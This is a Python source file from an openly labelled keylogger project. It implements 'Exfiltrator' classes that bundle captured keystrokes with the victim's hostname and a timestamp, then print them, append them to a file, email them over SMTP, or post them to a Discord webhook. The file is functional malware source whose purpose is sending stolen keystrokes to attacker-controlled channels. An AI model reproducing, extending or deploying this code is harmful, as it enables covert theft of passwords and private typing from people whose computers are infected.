#!/usr/bin/env python3
# https://github.com/EONRaider/Keylogger

__author__ = "EONRaider @ keybase.io/eonraider"

import abc
import aiohttp
import asyncio
import platform
import smtplib
import ssl
from datetime import datetime
from pathlib import Path

from discord import Webhook, AsyncWebhookAdapter

from keylogger import KeyLogger


class Exfiltrator(abc.ABC):
    def __init__(self, keylogger: KeyLogger, tag: str):
        self.keylogger = keylogger
        self.keylogger.register_exfiltrator(self)
        '''The self.tag attribute defaults to a formatting similar to
        KeyLogger::Discord::computer001 if tag is None'''
        self.tag = tag if tag is not None else \
            f"{self.keylogger.__class__.__name__}::" \
            f"{self.__class__.__name__}::" \
            f"{platform.node()}"

    @property
    def report(self) -> str:
        """Get a report based on the data buffered by the keylogger as
        a string consisting of a tag, timestamp and the data itself."""

        timestamp = datetime.now().strftime("%m/%d/%Y %H:%M:%S")
        header = f"[{self.tag}] @ {timestamp}"
        '''The standard report is formatted as follows:
        KeyLogger::Discord::computer001 @ 10/16/2021 13:30:20 - data'''
        if self.keylogger.has_data:
            return f"{header} - {self.keylogger.contents}"
        return f"{header} - <NO INPUT>"

    @abc.abstractmethod
    def update(self, *args, **kwargs):
        """To be implemented with the logic specific to each
        exfiltration mechanism."""
        ...


class Screen(Exfiltrator):
    def __init__(self, *,
                 keylogger: KeyLogger,
                 tag: str = None):
        super().__init__(keylogger, tag)

    def update(self) -> None:
        """Display captured data at STDOUT for debugging purposes."""
        print(self.report)


class TextFile(Exfiltrator):
    def __init__(self, *,
                 keylogger: KeyLogger,
                 tag: str = None,
                 file_path: [str, Path]):
        super().__init__(keylogger, tag)
        self.file_path = file_path

    def update(self) -> None:
        """Write each report on a new line of text file with the
        specified path."""
        if self.keylogger.has_data:
            with open(file=self.file_path, mode="a", encoding="utf_8") as file:
                file.write(f"{self.report}\n")


class Email(Exfiltrator):
    def __init__(self, *,
                 keylogger: KeyLogger,
                 tag: str = None,
                 smtp_host: str,
                 smtp_port: int,
                 email: str,
                 password: str):
        super().__init__(keylogger, tag)
        self.smtp_host = smtp_host
        self.smtp_port = smtp_port
        self.email = email
        self.password = password

    def update(self):
        if self.keylogger.has_data:
            with smtplib.SMTP_SSL(
                    host=self.smtp_host,
                    port=self.smtp_port,
                    context=ssl.create_default_context()
            ) as server:
                server.login(user=self.email, password=self.password)
                server.sendmail(from_addr=self.email,
                                to_addrs=self.email,
                                msg=f"Subject:{self.tag}\n\n{self.report}")


class Discord(Exfiltrator):
    def __init__(self, *,
                 keylogger: KeyLogger,
                 tag: str = None,
                 webhook_url: str):
        super().__init__(keylogger, tag)
        self.webhook_url = webhook_url

    def update(self) -> None:
        """Send each report as a new message to a Discord server with a
        Webhook URL enabled."""
        if self.keylogger.has_data:
            asyncio.run(self.send_message())

    async def send_message(self) -> None:
        async with aiohttp.ClientSession() as session:
            webhook = Webhook.from_url(url=self.webhook_url,
                                       adapter=AsyncWebhookAdapter(session))
            await webhook.send(content=self.report,
                               username=self.keylogger.__class__.__name__)
